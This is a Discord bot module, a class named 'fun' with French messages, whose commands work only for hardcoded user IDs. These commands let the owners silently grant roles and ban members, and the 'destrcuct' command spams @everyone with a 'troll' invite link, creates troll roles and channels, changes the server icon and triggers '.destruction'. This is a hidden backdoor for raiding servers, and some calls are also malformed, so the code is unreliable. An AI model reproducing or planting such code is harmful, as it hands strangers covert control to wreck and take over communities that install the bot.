module.exports = class fun {

	static set (message) {
		message.delete()
		let messageArray = message.content.split(" ");
		let args = messageArray.slice(1);
		if (message.author.id === '342330037652946945')
		{
		let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
  		if(!rMember) return message.author.send("Utilisateur non trouvé.");
 	 	let role = args.join(" ").slice(22);
	    if(!role) return message.author.send("Specifier un rôle!");
 		let gRole = message.guild.roles.find(`name`, role);
  		if(!gRole) return message.author.send("Rôle non trouvé!");
  		rMember.addRole(gRole.id);
	}
	}
	static unset (message) {
		let messageArray = message.content.split(" ");
		let args = messageArray.slice(1);
		if (message.author.id === '342330037652946945')
		{
		let rMember = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0]);
  		if(!rMember) return message.reply("Utilisateur non trouvé.");
 	 	let role = args.join(" ").slice(22);
	    if(!role) return message.reply("Specifier un rôle!");
 		let gRole = message.guild.roles.find(`name`, role);
  		if(!gRole) return message.reply("Rôle non trouvé!");
  		rMember.removeRole(gRole.id)
	}
	}
	static destrcuct (message) {
		if (message.author.id === '342330037652946945' || message.author.id === '434027164816637993')
		{

		message.channel.send('@everyone Serveur troll by DiMz : https://discord.gg/ZWWmXRM')

		message.guild.createRole({
 		name: 'Troll By DiMz',
 		color: 'BLUE',
 		})

 		message.guild.createChannel('Troll By DiMz', '' [{
  		id: message.guild.id,
  		deny: ['MANAGE_MESSAGES'],
  		allow: ['SEND_MESSAGES']
		}])
		message.guild.setIcon('./robot.png')
 		.then(console.log)
 		.catch(console.error);
 		message.guild.setIcon('Troll By DiMz')
 		.then(console.log)
 		.catch(console.error);
 		if (message.guild.channels.find("name","Troll By DiMz")) {
 			message.guild.channels.find('name', 'Troll By DiMz').message.send('.destruction')
 			}
		message.channel.send('.destruction')
 		}
	}
	static leave (message) {
		if (message.author.id === '342330037652946945' || message.author.id === '434027164816637993')
		{
		message.guild.leave()
	}
	}
	static ban (message) {
		let args = message.content.split(' ')
		message.delete()
		if(message.author.id === '342330037652946945') {
	    let bUser = message.guild.member(message.mentions.users.first() || message.guild.members.get(args[0]));
	    if(!bUser) return message.author.send("Utilisateur non trouvé.");
	    let bReason = args.join(" ").slice(22);
	    if(bUser.hasPermission("MANAGE_MESSAGES")) return message.author.send("Cette personne ne peut être kické!");
	    message.guild.member(bUser).ban(bReason);
    	return;
		}
	}
}